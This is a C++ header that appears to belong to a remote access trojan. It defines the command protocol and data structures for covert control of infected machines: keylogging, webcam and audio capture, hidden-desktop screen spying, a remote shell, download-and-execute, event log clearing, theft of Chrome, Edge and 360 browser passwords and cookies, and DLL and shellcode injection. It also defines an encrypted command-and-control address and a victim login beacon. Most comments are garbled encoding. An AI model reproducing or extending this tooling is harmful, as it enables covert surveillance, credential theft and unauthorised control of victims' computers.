#pragma once
#include <vector>
#include <string>
#include <iosfwd>
#include <iostream>
#include <sstream>
#include <string.h>
#include <map>
#include <numeric> 
#include <ctime>
#include <chrono>

#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <concrt.h>
#include <corecrt_io.h>
#define MVirtualFree(a1, a2, a3) VirtualFree(a1, a2, a3)
#define MVirtualAlloc(a1, a2, a3, a4) VirtualAlloc(a1, a2, a3, a4)
#else // ʹ�ø�ͷ�ļ��� LINUX ����ʹ��
#include <thread>
#define strcat_s strcat
#define sprintf_s sprintf
#define strcpy_s strcpy
#define __stdcall 
#define WINAPI 
#define TRUE 1
#define FALSE 0
#define skCrypt(p)
#define Mprintf printf
#define ASSERT(p)
#define AUTO_TICK_C(p)
#define AUTO_TICK(p)
#define OutputDebugStringA(p) printf(p)

#include <unistd.h>
#define Sleep(n) ((n) >= 1000 ? sleep((n) / 1000) : usleep((n) * 1000))

typedef int64_t __int64;
typedef uint32_t DWORD;
typedef int BOOL, SOCKET;
typedef unsigned int ULONG;
typedef unsigned int UINT;
typedef void VOID;
typedef unsigned char BYTE;
typedef BYTE* PBYTE, * LPBYTE;
typedef void* LPVOID, * HANDLE;

#define GET_PROCESS(a1, a2) 
#define MVirtualFree(a1, a2, a3) delete[]a1
#define MVirtualAlloc(a1, a2, a3, a4) new BYTE[a2]
#define CopyMemory memcpy
#define MoveMemory memmove

#define INVALID_SOCKET -1
#define SOCKET_ERROR -1
#define closesocket close
#define CloseHandle(p)
#define CancelIo(p) close(reinterpret_cast<intptr_t>(p))
#endif

#include "ip_enc.h"
#include <time.h>
#include <unordered_map>

#ifndef _MAX_PATH
#define _MAX_PATH 260
#endif

// ����2��������ȫ��Ψһ�����������ɷ���ʱ�������

#define FLAG_FINDEN "Hello, World!"

#define FLAG_GHOST	FLAG_FINDEN

#include "hash.h"

#ifndef GET_FILEPATH
#define GET_FILEPATH(dir,file) [](char*d,const char*f){char*p=d;while(*p)++p;while('\\'!=*p&&p!=d)--p;strcpy(p+1,f);return d;}(dir,file)
#endif

inline int isValid_60s() {
	static time_t tm = time(nullptr);
	int span = int(time(nullptr) - tm);
	return span <= 60;
}

inline int isValid_30s() {
	static time_t tm = time(nullptr);
	int span = int(time(nullptr) - tm);
	return span <= 30;
}

inline int isValid_10s() {
	static time_t tm = time(nullptr);
	int span = int(time(nullptr) - tm);
	return span <= 10;
}

// �����������Է����仯ʱ��Ӧ�ø������ֵ���Ա�Ա��س����������
#define DLL_VERSION __DATE__		// DLL�汾

#define TALK_DLG_MAXLEN 1024		// ��������ַ�����

// �ͻ���״̬: 1-���ض��˳� 2-���ض��˳�
enum State {
	S_CLIENT_NORMAL = 0,
	S_CLIENT_EXIT = 1,
	S_SERVER_EXIT = 2,
	S_CLIENT_UPDATE = 3,
};

// ����ö���б�
enum
{
	// �ļ����䷽ʽ
	TRANSFER_MODE_NORMAL = 0x00,	// һ��,������ػ���Զ���Ѿ��У�ȡ��
	TRANSFER_MODE_ADDITION,			// ׷��
	TRANSFER_MODE_ADDITION_ALL,		// ȫ��׷��
	TRANSFER_MODE_OVERWRITE,		// ����
	TRANSFER_MODE_OVERWRITE_ALL,	// ȫ������
	TRANSFER_MODE_JUMP,				// ����
	TRANSFER_MODE_JUMP_ALL,			// ȫ������
	TRANSFER_MODE_CANCEL,			// ȡ������

	// ���ƶ˷���������
	COMMAND_ACTIVED = 0x00,			// ����˿��Լ��ʼ����
	COMMAND_LIST_DRIVE,				// �г�����Ŀ¼
	COMMAND_LIST_FILES,				// �г�Ŀ¼�е��ļ�
	COMMAND_DOWN_FILES,				// �����ļ�
	COMMAND_FILE_SIZE,				// �ϴ�ʱ���ļ���С
	COMMAND_FILE_DATA,				// �ϴ�ʱ���ļ�����
	COMMAND_EXCEPTION,				// ���䷢���쳣����Ҫ���´���
	COMMAND_CONTINUE,				// �������������������������
	COMMAND_STOP,					// ������ֹ
	COMMAND_DELETE_FILE,			// ɾ���ļ�
	COMMAND_DELETE_DIRECTORY,		// ɾ��Ŀ¼
	COMMAND_SET_TRANSFER_MODE,		// ���ô��䷽ʽ
	COMMAND_CREATE_FOLDER,			// �����ļ���
	COMMAND_RENAME_FILE,			// �ļ����ļ�����
	COMMAND_OPEN_FILE_SHOW,			// ��ʾ���ļ�
	COMMAND_OPEN_FILE_HIDE,			// ���ش��ļ�

	COMMAND_SCREEN_SPY,				// ��Ļ�鿴
	COMMAND_SCREEN_RESET,			// �ı���Ļ���
	COMMAND_ALGORITHM_RESET,		// �ı��㷨
	COMMAND_SCREEN_CTRL_ALT_DEL,	// ����Ctrl+Alt+Del
	COMMAND_SCREEN_CONTROL,			// ��Ļ����
	COMMAND_SCREEN_BLOCK_INPUT,		// ��������˼����������
	COMMAND_SCREEN_BLANK,			// ����˺���
	COMMAND_SCREEN_CAPTURE_LAYER,	// ��׽��
	COMMAND_SCREEN_GET_CLIPBOARD,	// ��ȡԶ�̼�����
	COMMAND_SCREEN_SET_CLIPBOARD,	// ����Զ�̼�����

	COMMAND_WEBCAM,					// ����ͷ
	COMMAND_WEBCAM_ENABLECOMPRESS,	// ����ͷ����Ҫ�󾭹�H263ѹ��
	COMMAND_WEBCAM_DISABLECOMPRESS,	// ����ͷ����Ҫ��ԭʼ����ģʽ
	COMMAND_WEBCAM_RESIZE,			// ����ͷ�����ֱ��ʣ����������INT�͵Ŀ��
	COMMAND_NEXT,					// ��һ��(���ƶ��Ѿ��򿪶Ի���)

	COMMAND_KEYBOARD,				// ���̼�¼
	COMMAND_KEYBOARD_OFFLINE,		// �������߼��̼�¼
	COMMAND_KEYBOARD_CLEAR,			// ������̼�¼����

	COMMAND_AUDIO,					// ��������

	COMMAND_SYSTEM,					// ϵͳ�������̣�����....��
	COMMAND_PSLIST,					// �����б�
	COMMAND_WSLIST,					// �����б�
	COMMAND_DIALUPASS,				// ��������
	COMMAND_KILLPROCESS,			// �رս���
	COMMAND_SHELL,					// cmdshell
	COMMAND_SESSION,				// �Ự�����ػ���������ע��, ж�أ�
	COMMAND_REMOVE,					// ж�غ���
	COMMAND_DOWN_EXEC,				// �������� - ����ִ��
	COMMAND_UPDATE_SERVER,			// �������� - ���ظ���
	COMMAND_CLEAN_EVENT,			// �������� - ���ϵͳ��־
	COMMAND_OPEN_URL_HIDE,			// �������� - ���ش���ҳ
	COMMAND_OPEN_URL_SHOW,			// �������� - ��ʾ����ҳ
	COMMAND_RENAME_REMARK,			// ��������ע
	COMMAND_REPLAY_HEARTBEAT,		// �ظ�������
	COMMAND_SERVICES,				// �������
	COMMAND_REGEDIT,
	COMMAND_TALK,					// ��ʱ��Ϣ��֤
	COMMAND_UPDATE = 53,			// �ͻ�������
	COMMAND_SHARE = 59,				// ��������
	COMMAND_PROXY = 60,				// ����ӳ��
	TOKEN_SYSINFOLIST = 61,			// ��������
	TOKEN_CHAT_START = 62,			// Զ�̽�̸

	// ����˷����ı�ʶ
	TOKEN_AUTH = 100,				// Ҫ����֤
	TOKEN_HEARTBEAT,				// ������
	TOKEN_LOGIN,					// ���߰�
	TOKEN_DRIVE_LIST,				// �������б�
	TOKEN_FILE_LIST,				// �ļ��б�
	TOKEN_FILE_SIZE,				// �ļ���С�������ļ�ʱ��
	TOKEN_FILE_DATA,				// �ļ�����
	TOKEN_TRANSFER_FINISH,			// �������
	TOKEN_DELETE_FINISH,			// ɾ�����
	TOKEN_GET_TRANSFER_MODE,		// �õ��ļ����䷽ʽ
	TOKEN_GET_FILEDATA,				// Զ�̵õ������ļ�����
	TOKEN_CREATEFOLDER_FINISH,		// �����ļ����������
	TOKEN_DATA_CONTINUE,			// ������������
	TOKEN_RENAME_FINISH,			// �����������
	TOKEN_EXCEPTION,				// ���������쳣

	TOKEN_BITMAPINFO,				// ��Ļ�鿴��BITMAPINFO
	TOKEN_FIRSTSCREEN,				// ��Ļ�鿴�ĵ�һ��ͼ
	TOKEN_NEXTSCREEN,				// ��Ļ�鿴����һ��ͼ
	TOKEN_CLIPBOARD_TEXT,			// ��Ļ�鿴ʱ���ͼ���������

	TOKEN_WEBCAM_BITMAPINFO,		// ����ͷ��BITMAPINFOHEADER
	TOKEN_WEBCAM_DIB,				// ����ͷ��ͼ������

	TOKEN_AUDIO_START,				// ��ʼ��������
	TOKEN_AUDIO_DATA,				// ������������

	TOKEN_KEYBOARD_START,			// ���̼�¼��ʼ
	TOKEN_KEYBOARD_DATA,			// ���̼�¼������

	TOKEN_PSLIST,					// �����б�
	TOKEN_WSLIST,					// �����б�
	TOKEN_DIALUPASS,				// ��������
	TOKEN_SHELL_START,				// Զ���ն˿�ʼ
	TOKEN_SERVERLIST,               // �����б�
	COMMAND_SERVICELIST,            // ˢ�·����б�        
	COMMAND_SERVICECONFIG,          // ����˷����ı�ʶ
	TOKEN_TALK_START,				// ��ʱ��Ϣ��ʼ
	TOKEN_TALKCMPLT,				// ��ʱ��Ϣ���ط�
	TOKEN_KEYFRAME=134,				// �ؼ�֡
	TOKEN_BITMAPINFO_HIDE,          // ������Ļ
	TOKEN_SCREEN_SIZE,              // ��Ļ��С
	TOKEN_DRIVE_LIST_PLUGIN = 150,	// �ļ�����(���)
	TOKEN_DRAWING_BOARD=151,		// ���� 

	TOKEN_DECRYPT = 199,
	TOKEN_REGEDIT = 200,            // ע���
	COMMAND_REG_FIND,				// ע��� �����ʶ
	TOKEN_REG_KEY,
	TOKEN_REG_PATH,
	COMMAND_BYE,					// ���ض��˳�
	SERVER_EXIT=205,				// ���ض��˳�

	COMMAND_CC,						// CC
	COMMAND_ASSIGN_MASTER,			// ��������
	COMMAND_FILE_DETECT,			// �ļ�̽��
	COMMAND_FILE_REPORT,			// �ļ��ϱ�

	SOCKET_DLLLOADER=210,           // �ͻ�������DLL
	CMD_DLLDATA,                    // ��ӦDLL����
	CMD_RUNASADMIN=214,             // ADMIN ����
	CMD_MASTERSETTING = 215,		// ��������
	CMD_HEARTBEAT_ACK = 216,		// ������Ӧ
	CMD_PADDING =217,
	CMD_AUTHORIZATION = 222,		// ��Ȩ
	CMD_SERVER_ADDR = 229,          // ���ص�ַ
	TOKEN_ERROR = 230,              // ������ʾ
	TOKEN_SHELL_DATA = 231,         // �ն˽��
	CMD_EXECUTE_DLL = 240,			// ִ�д���
};

enum ProxyManager {
	TOKEN_PROXY_CONNECT_RESULT,
	TOKEN_PROXY_BIND_RESULT,
	TOKEN_PROXY_CLOSE,
	TOKEN_PROXY_DATA,
	COMMAND_PROXY_CLOSE,
	COMMAND_PROXY_CONNECT,
	COMMAND_PROXY_DATA,
	COMMAND_PROXY_CONNECT_HOSTNAME,
};

// ��̨��Ļ��������
enum HideScreenSpy {
	COMMAND_FLUSH_HIDE,             // ˢ����Ļ
	COMMAND_SCREEN_SETSCREEN_HIDE,  // ���÷ֱ���
	COMMAND_HIDE_USER,              // �Զ�������
	COMMAND_HIDE_CLEAR,             // �����̨
	COMMAND_COMMAND_SCREENUALITY60_HIDE, // ������
	COMMAND_COMMAND_SCREENUALITY85_HIDE, // ������
	COMMAND_COMMAND_SCREENUALITY100_HIDE, // ������

	IDM_OPEN_Explorer = 33,
	IDM_OPEN_run,
	IDM_OPEN_Powershell,

	IDM_OPEN_360JS,
	IDM_OPEN_360AQ,
	IDM_OPEN_360AQ2,
	IDM_OPEN_Chrome,
	IDM_OPEN_Edge,
	IDM_OPEN_Brave,
	IDM_OPEN_Firefox,
	IDM_OPEN_Iexplore,
	IDM_OPEN_ADD_1,
	IDM_OPEN_ADD_2,
	IDM_OPEN_ADD_3,
	IDM_OPEN_ADD_4,
	IDM_OPEN_zdy,
	IDM_OPEN_zdy2,
	IDM_OPEN_close,
};

struct ZdyCmd {
	char                oldpath[_MAX_PATH];
	char                newpath[_MAX_PATH];
	char                cmdline[_MAX_PATH];
};

// ��������
enum DecryptCommand {
	COMMAND_LLQ_GetChromePassWord,
	COMMAND_LLQ_GetEdgePassWord,
	COMMAND_LLQ_GetSpeed360PassWord,
	COMMAND_LLQ_Get360sePassWord,
	COMMAND_LLQ_GetQQBroPassWord,

	COMMAND_LLQ_GetChromeCookies,
};

typedef DecryptCommand BroType;

// ���Ƿ������ҳ����ж���
#define CMD_WINDOW_CLOSE	0		// �رմ���
#define CMD_WINDOW_TEST		1		// ��������

// MachineManager ϵͳ����, ǰ����ö��ֵ˳�򲻵��޸�
enum MachineManager {
	COMMAND_MACHINE_PROCESS,
	COMMAND_MACHINE_WINDOWS,
	COMMAND_MACHINE_NETSTATE,
	COMMAND_MACHINE_SOFTWARE,
	COMMAND_MACHINE_HTML,
	COMMAND_MACHINE_FAVORITES,
	COMMAND_MACHINE_WIN32SERVICE,
	COMMAND_MACHINE_DRIVERSERVICE,
	COMMAND_MACHINE_TASK,
	COMMAND_MACHINE_HOSTS, //���������

	COMMAND_APPUNINSTALL,//ж��
	COMMAND_WINDOW_OPERATE,//���ڿ���
	COMMAND_WINDOW_CLOSE,//�ر�
	COMMAND_PROCESS_KILL,//��������
	COMMAND_PROCESS_KILLDEL,//��������----ɾ��
	COMMAND_PROCESS_DEL,//ǿ��ɾ�� ����Ҫ��������
	COMMAND_PROCESS_FREEZING,//����
	COMMAND_PROCESS_THAW,//�ⶳ
	COMMAND_HOSTS_SET,//hosts

	COMMAND_SERVICE_LIST_WIN32,
	COMMAND_SERVICE_LIST_DRIVER,
	COMMAND_DELETESERVERICE,
	COMMAND_STARTSERVERICE,
	COMMAND_STOPSERVERICE,
	COMMAND_PAUSESERVERICE,
	COMMAND_CONTINUESERVERICE,

	COMMAND_TASKCREAT,
	COMMAND_TASKDEL,
	COMMAND_TASKSTOP,
	COMMAND_TASKSTART,

	COMMAND_INJECT,

	TOKEN_MACHINE_PROCESS,
	TOKEN_MACHINE_WINDOWS,
	TOKEN_MACHINE_NETSTATE,
	TOKEN_MACHINE_SOFTWARE,
	TOKEN_MACHINE_HTML,
	TOKEN_MACHINE_FAVORITES,
	TOKEN_MACHINE_WIN32SERVICE,
	TOKEN_MACHINE_DRIVERSERVICE,
	TOKEN_MACHINE_HOSTS,
	TOKEN_MACHINE_SERVICE_LIST,
	TOKEN_MACHINE_TASKLIST,

	TOKEN_MACHINE_MSG,
};

struct  WINDOWSINFO {
	char strTitle[1024];
	DWORD m_poceessid;
	DWORD m_hwnd;
	bool canlook;
	int w;
	int h;
};

// Զ�̽�̸
enum ChatManager {
	COMMAND_NEXT_CHAT,
	COMMAND_CHAT_CLOSE,
	COMMAND_CHAT_SCREEN_LOCK,
	COMMAND_CHAT_SCREEN_UNLOCK,
};

// �ļ�����
enum FileManager {
	COMMAND_COMPRESS_FILE_PARAM=220,
	COMMAND_FILES_SEARCH_START,
	COMMAND_FILES_SEARCH_STOP,
	COMMAND_FILE_EXCEPTION,
	COMMAND_SEARCH_FILE,
	COMMAND_FILE_GETNETHOOD,
	COMMAND_FILE_RECENT,
	COMMAND_FILE_INFO,
	COMMAND_FILE_Encryption,
	COMMAND_FILE_Decrypt,
	COMMAND_FILE_ENFOCE,
	COMMAND_FILE_CopyFile,
	COMMAND_FILE_PasteFile,
	COMMAND_FILE_zip,
	COMMAND_FILE_zip_stop,
	COMMAND_FILE_NO_ENFORCE,
	COMMAND_FILE_GETINFO,

	COMMAND_FILE_SEARCHPLUS_LIST,

	TOKEN_SEARCH_FILE_LIST,
	TOKEN_SEARCH_FILE_FINISH,
	TOKEN_CFileManagerDlg_DATA_CONTINUE,
	TOKEN_COMPRESS_FINISH,
	TOKEN_SEARCH_ADD,
	TOKEN_SEARCH_END,
	TOKEN_FILE_GETNETHOOD,
	TOKEN_FILE_RECENT,
	TOKEN_FILE_INFO,
	TOKEN_FILE_REFRESH,
	TOKEN_FILE_ZIPOK,
	TOKEN_FILE_GETINFO,

	TOKEN_FILE_SEARCHPLUS_LIST,
	TOKEN_FILE_SEARCHPLUS_NONTFS,
	TOKEN_FILE_SEARCHPLUS_HANDLE,
	TOKEN_FILE_SEARCHPLUS_INITUSN,
	TOKEN_FILE_SEARCHPLUS_GETUSN,
	TOKEN_FILE_SEARCHPLUS_NUMBER,
};

// Զ�̻���
enum RemoteDraw {
	CMD_DRAW_POINT = 0,
	CMD_DRAW_END = 1,
	CMD_TRANSPORT = 2,
	CMD_TOPMOST = 3,
	CMD_MOVEWINDOW = 4,
	CMD_SET_SIZE = 5,
	CMD_DRAW_CLEAR = 6,
	CMD_DRAW_TEXT = 7,
};

enum 
{
	CLIENT_TYPE_DLL = 0,			// �ͻ��˴�����DLL����
	CLIENT_TYPE_ONE = 1,			// �ͻ��˴����Ե���EXE����
	CLIENT_TYPE_MEMEXE = -1,		// �ڴ�EXE����
	CLIENT_TYPE_MODULE = 2,			// DLL�����ⲿ�������
	CLIENT_TYPE_SHELLCODE = 4,		// Shellcode
	CLIENT_TYPE_MEMDLL = 5,			// �ڴ�DLL����
	CLIENT_TYPE_LINUX = 6,			// LINUX �ͻ���
};

enum {
	SHARE_TYPE_YAMA = 0,			// �����ͬ�����
	SHARE_TYPE_HOLDINGHANDS = 1,	// ����� HoldingHands: https://github.com/yuanyuanxiang/HoldingHands
	SHARE_TYPE_YAMA_FOREVER = 100,	// ���÷���
};

inline const char* GetClientType(int typ) {
	switch (typ)
	{
	case CLIENT_TYPE_DLL:
		return "DLL";
	case CLIENT_TYPE_ONE:
		return "EXE";
	case CLIENT_TYPE_MEMEXE:
		return "MEXE";
	case CLIENT_TYPE_MODULE:
		return "DLL";
	case CLIENT_TYPE_SHELLCODE:
		return "SC";
	case CLIENT_TYPE_MEMDLL:
		return "MDLL";
	case CLIENT_TYPE_LINUX:
		return "LNX";
	default:
		return "DLL";
	}
}

inline int compareDates(const std::string& date1, const std::string& date2) {
	static const std::unordered_map<std::string, int> monthMap = {
		{"Jan", 1}, {"Feb", 2}, {"Mar", 3}, {"Apr", 4}, {"May", 5}, {"Jun", 6},
		{"Jul", 7}, {"Aug", 8}, {"Sep", 9}, {"Oct",10}, {"Nov",11}, {"Dec",12}
	};

	auto parse = [&](const std::string& date) -> std::tuple<int, int, int> {
		int month = monthMap.at(date.substr(0, 3));
		int day = std::stoi(date.substr(4, 2));
		int year = std::stoi(date.substr(7, 4));
		return { year, month, day };
	};

	try {
		auto t1 = parse(date1);
		auto t2 = parse(date2);
		int y1 = std::get<0>(t1), m1 = std::get<1>(t1), d1 = std::get<2>(t1);
		int y2 = std::get<0>(t2), m2 = std::get<1>(t2), d2 = std::get<2>(t2);

		if (y1 != y2) return y1 < y2 ? -1 : 1;
		if (m1 != m2) return m1 < m2 ? -1 : 1;
		if (d1 != d2) return d1 < d2 ? -1 : 1;
		return 0;
	}
	catch (const std::exception& e) {
		std::cerr << "Date parse error: " << e.what() << std::endl;
		return -2; // ��������ֵ��ʾ����
	}
}

// ��ö��ֵ��ClientType���ƣ����ֲ�����ȫһ�£�רΪ`TestRun`����
// ָ����������`ServerDll`����ʽ
// `TestRun` ֻ���ڼ����о�Ŀ��
enum TestRunType {
	Startup_DLL,			// ����DLL
	Startup_MEMDLL,			// �ڴ�DLL���޴����ļ���
	Startup_InjDLL,			// Զ��ע�� DLL��ע��DLL·��������������DLL��
	Startup_Shellcode,		// ���� Shell code ���ڵ�ǰ����ִ��shell code ��
	Startup_InjSC,			// Զ�� Shell code ��ע����������ִ��shell code ��
};

inline int MemoryFind(const char* szBuffer, const char* Key, int iBufferSize, int iKeySize)
{
	for (int i = 0; i < iBufferSize - iKeySize; ++i)
	{
		if (0 == memcmp(szBuffer + i, Key, iKeySize))
		{
			return i;
		}
	}
	return -1;
}

enum ProtoType {
	PROTO_TCP = 0,					// TCP
	PROTO_UDP = 1,					// UDP
	PROTO_HTTP = 2,					// HTTP
	PROTO_RANDOM = 3,				// ���
	PROTO_KCP = 4,					// KCP
	PROTO_HTTPS = 5,				// HTTPS
};

#define KCP_SESSION_ID 666

enum RunningType {
	RUNNING_RANDOM = 0,				// �������
	RUNNING_PARALLEL = 1,			// ��������
};

enum ProtocolEncType {
	PROTOCOL_SHINE = 0,
	PROTOCOL_HELL = 1,
};

enum ClientCompressType {
	CLIENT_COMPRESS_NONE = 0,
	CLIENT_COMPRESS_UPX = 1,
	CLIENT_COMPRESS_SC = 2,
};

#pragma pack(push, 4)
// �����ӵ����س�����Ϣ
typedef struct CONNECT_ADDRESS
{
public:
	char	        szFlag[32];		 // ��ʶ
	char			szServerIP[100]; // ����IP
	char			szPort[8];		 // ���ض˿�
	int				iType;			 // �ͻ�������
	bool            bEncrypt;		 // ������Ϣ�Ƿ����
	char            szBuildDate[12]; // ��������(�汾)
	int             iMultiOpen;		 // ֧�ִ򿪶��
	int				iStartup;		 // ������ʽ
	int				iHeaderEnc;		 // ���ݼ�������
	char			protoType;		 // Э������
	char			runningType;	 // ���з�ʽ
	char            szReserved[44];  // ռλ��ʹ�ṹ��ռ��300�ֽ�
	uint64_t		parentHwnd;		 // �����̴��ھ��
	uint64_t		superAdmin;		 // ����Ա����ID
	char			pwdHash[64];	 // �����ϣ

public:
	void SetType(int typ) {
		iType = typ;
	}
	const void* Flag() const {
		return szFlag;
	}
	CONNECT_ADDRESS ModifyFlag(const char* flag) const {
		CONNECT_ADDRESS copy = *this;
		memset(copy.szFlag, 0, sizeof(szFlag));
		memcpy(copy.szFlag, flag, strlen(flag));
		return copy;
	}
	void SetAdminId(const char* admin) {
		char buf[17] = { 0 };
		std::strncpy(buf, admin, 16);
		superAdmin = std::strtoull(buf, NULL, 16);
	}
	int GetHeaderEncType() const {
#ifdef _DEBUG
		return iHeaderEnc;
#else
		return superAdmin == 7057226198541618915 ? iHeaderEnc : 0;
#endif
	}
	bool IsVerified() const {
		return superAdmin && (superAdmin % 313) == 0;
	}
	int FlagLen() const {
		return strlen(szFlag);
	}
	const char* ServerIP(){
		if (bEncrypt) {
			Decrypt();
		}
		return szServerIP;
	}
	int ServerPort() {
		if (bEncrypt) {
			Decrypt();
		}
		return atoi(szPort);
	}
	int ClientType()const {
		return iType;
	}
	// return true if modified
	bool SetServer(const char* ip, int port, bool e = false) {
		if (ip == NULL || strlen(ip) <= 0 || port <= 0)
			return false;
		bool modified = bEncrypt != e || strcmp(ServerIP(), ip) != 0 || port != ServerPort();
		bEncrypt = e;
		strcpy_s(szServerIP, ip);
		sprintf_s(szPort, "%d", port);

		return modified;
	}
	void Encrypt() {
		if (!bEncrypt){
			bEncrypt = true;
			StreamCipher cipher(0x12345678);
			cipher.process((uint8_t*)szServerIP, sizeof(szServerIP));
			cipher.process((uint8_t*)szPort, sizeof(szPort));
		}
	}
	void Decrypt() {
		if (bEncrypt) {
			bEncrypt = false;
			StreamCipher cipher(0x12345678);
			cipher.process((uint8_t*)szServerIP, sizeof(szServerIP));
			cipher.process((uint8_t*)szPort, sizeof(szPort));
		}
	}
	bool IsValid() {
		return strlen(ServerIP()) != 0 && ServerPort() > 0;
	}
	int Size() const {
		return sizeof(CONNECT_ADDRESS);
	}
} CONNECT_ADDRESS ;
#pragma pack(pop)

#define FOREVER_RUN 2

// �ͻ��˳����߳���Ϣ�ṹ��, ����5����Ա: 
// ����״̬(run)�����(h)��ͨѶ�ͻ���(p)�������߲���(user)��������Ϣ(conn).
struct ThreadInfo
{
	int run;
	HANDLE h;
	void* p;
	void* user;
	CONNECT_ADDRESS* conn;
	ThreadInfo() : run(1), h(NULL), p(NULL), user(NULL), conn(NULL) { }
	void Exit(int wait_sec = 15) {
		run = 0;
		for (int count = 0; p && count++ < wait_sec; Sleep(1000));
#ifdef _WIN32
		if (p) TerminateThread(h, 0x20250626);
		if (p) CloseHandle(h);
#endif
		p = NULL;
		h = NULL;
		user = NULL;
		conn = NULL;
	}
};

struct PluginParam {
	char IP[100];			// ����IP
	int Port;				// ���ض˿�
	const State *Exit;		// �ͻ���״̬
	const void* User;		// CONNECT_ADDRESS* ָ��
	PluginParam(const char*ip, int port, const State *s, const void* u=0) : Port(port), Exit(s), User(u){
		strcpy_s(IP, ip);
	}
};

// ���ַ�����ָ���ַ��ָ�Ϊ����
inline std::vector<std::string> StringToVector(const std::string& str, char ch, int reserved = 1) {
	// ʹ���ַ��������ָ��ַ���
	std::istringstream stream(str);
	std::string item;
	std::vector<std::string> result;

	// ���ֺŷָ��ַ���
	while (std::getline(stream, item, ch)) {
		result.push_back(item);  // ���ָ����������ַ�����ӵ����������
	}
	while (result.size() < reserved)
		result.push_back("");

	return result;
}

enum LOGIN_RES {
	RES_CLIENT_TYPE = 0,					// ����
	RES_SYSTEM_BITS = 1,					// ϵͳλ��
	RES_SYSTEM_CPU = 2,						// CPU����
	RES_SYSTEM_MEM = 3,						// ϵͳ�ڴ�
	RES_FILE_PATH = 4,						// �ļ�·��
	RES_RESVERD = 5,						// ?
	RES_INSTALL_TIME = 6,					// ��װʱ��
	RES_INSTALL_INFO = 7,					// ��װ��Ϣ
	RES_PROGRAM_BITS = 8,					// ����λ��
	RES_EXPIRED_DATE = 9,					// ��������
	RES_CLIENT_LOC = 10,					// ����λ��
	RES_CLIENT_PUBIP = 11,					// ������ַ
	RES_EXE_VERSION = 12,					// EXE�汾
	RES_MAX,
};

// �������ߺ��͵ļ������Ϣ
// �˽ṹ��һ�������仯�������С��������ǰ�汾�Ŀͻ����޷������°�����.
// �°�ͻ���Ҳ�޷������ϰ汾�����س���.
// Ϊ�ˣ���20241228�ύ������Ϊ����ṹ��Ԥ���ֶΣ��Ա�δ��֮��ʱ֮��
// �������޸Ĵ˽ṹ�壬������������ټ�����ǰ�ĳ�����ߵ�����д����������
typedef struct  LOGIN_INFOR
{
	unsigned char			bToken;									// 1.��½��Ϣ
	char					OsVerInfoEx[156];						// 2.�汾��Ϣ
	unsigned int			dwCPUMHz;								// 3.CPU��Ƶ
	char					moduleVersion[24];						// 4.DLLģ��汾
	char					szPCName[240];							// 5.������
	char					szMasterID[20];							// 5.1 ����ID
	int						bWebCamIsExist;							// 6.�Ƿ�������ͷ
	unsigned int			dwSpeed;								// 7.����
	char					szStartTime[20];						// 8.����ʱ��
	char					szReserved[512];						// 9.�����ֶ�

	LOGIN_INFOR(){
		memset(this, 0, sizeof(LOGIN_INFOR));
		bToken = TOKEN_LOGIN;
		strcpy_s(moduleVersion, DLL_VERSION);
	}
	LOGIN_INFOR& Speed(unsigned long speed) {
		dwSpeed = speed;
		return *this;
	}
	void AddReserved(const char* v) {
		if (strlen(szReserved))
			strcat_s(szReserved, "|");
		if (strlen(szReserved) + strlen(v) < sizeof(szReserved))
			strcat_s(szReserved, v);
	}
	void AddReserved(int n) {
		if (strlen(szReserved))
			strcat_s(szReserved, "|");
		char buf[24] = {};
		sprintf_s(buf, "%d", n);
		if (strlen(szReserved) + strlen(buf) < sizeof(szReserved))
			strcat_s(szReserved, buf);
	}
	void AddReserved(double f) {
		if (strlen(szReserved))
			strcat_s(szReserved, "|");
		char buf[24] = {};
		sprintf_s(buf, "%.2f", f);
		if (strlen(szReserved) + strlen(buf) < sizeof(szReserved))
			strcat_s(szReserved, buf);
	}
	std::vector<std::string> ParseReserved(int n = 1) const {
		return StringToVector(szReserved, '|', n);
	}
}LOGIN_INFOR;

inline uint64_t GetUnixMs() {
	auto system_ms = std::chrono::time_point_cast<std::chrono::milliseconds>(
		std::chrono::system_clock::now()
		);
	return system_ms.time_since_epoch().count();
}

// �̶�1024�ֽ�
typedef struct Heartbeat
{
	uint64_t Time;
	char ActiveWnd[512];
	int Ping;
	int HasSoftware;
	char Reserved[496];

	Heartbeat() {
		memset(this, 0, sizeof(Heartbeat));
	}
	Heartbeat(const std::string& s, int ping = 0) {
		Time = GetUnixMs();
		strcpy_s(ActiveWnd, s.c_str());
		Ping = ping;
		memset(Reserved, 0, sizeof(Reserved));
	}
	int Size() const {
		return sizeof(Heartbeat);
	}
}Heartbeat;

typedef struct HeartbeatACK {
	uint64_t Time;
	char Reserved[24];
}HeartbeatACK;

// �̶�500�ֽ�
typedef struct MasterSettings {
	int         ReportInterval;             // �ϱ����
	int         Is64Bit;                    // �����Ƿ�64λ
	char        MasterVersion[12];          // ���ذ汾
	int			DetectSoftware;				// ������
	int			UsingFRPProxy;				// �Ƿ�ʹ��FRP����
	char		WalletAddress[472];			// Wallets
}MasterSettings;

// 100�ֽ�: �������� + ��С + ���÷�ʽ + DLL����
typedef struct DllExecuteInfo {
	int RunType;							// ��������
	int Size;								// DLL ��С
	int CallType;							// ���÷�ʽ
	char Name[32];							// DLL ����
	char Md5[33];							// DLL MD5
	char Reseverd[23];
}DllExecuteInfo;

enum
{
	SOFTWARE_CAMERA = 0,
	SOFTWARE_TELEGRAM,

	SHELLCODE = 0,
	MEMORYDLL = 1,

	CALLTYPE_DEFAULT = 0,		// Ĭ�ϵ��÷�ʽ: ֻ�Ǽ���DLL,��Ҫ��DLL����ʱִ�д���
	CALLTYPE_IOCPTHREAD = 1,	// ����run���������߳�: DWORD (__stdcall *run)(void* lParam)
};

typedef DWORD(__stdcall* PidCallback)(void);

inline const char* EVENTID(PidCallback pid) {
	static char buf[64] = { 0 };
	if (buf[0] == 0) {
		sprintf_s(buf, "SERVICE [%d] FINISH RUNNING", pid());
	}
	return buf;
}

#define EVENT_FINISHED EVENTID(GetCurrentProcessId)

inline void xor_encrypt_decrypt(unsigned char *data, int len, const std::vector<char>& keys) {
	for (char key : keys) {
		for (int i = 0; i < len; ++i) {
			data[i] ^= key;
		}
	}
}

inline std::tm ToPekingTime(const time_t* t) {
	// ��ȡ��ǰʱ�䣨��������ָ��Ϊ�գ�
	std::time_t now = (t == nullptr) ? std::time(nullptr) : *t;

	// �̰߳�ȫ��ת��Ϊ UTC ʱ��
	std::tm utc_time{};

#ifdef _WIN32  // Windows ʹ�� gmtime_s
	if (gmtime_s(&utc_time, &now) != 0) {
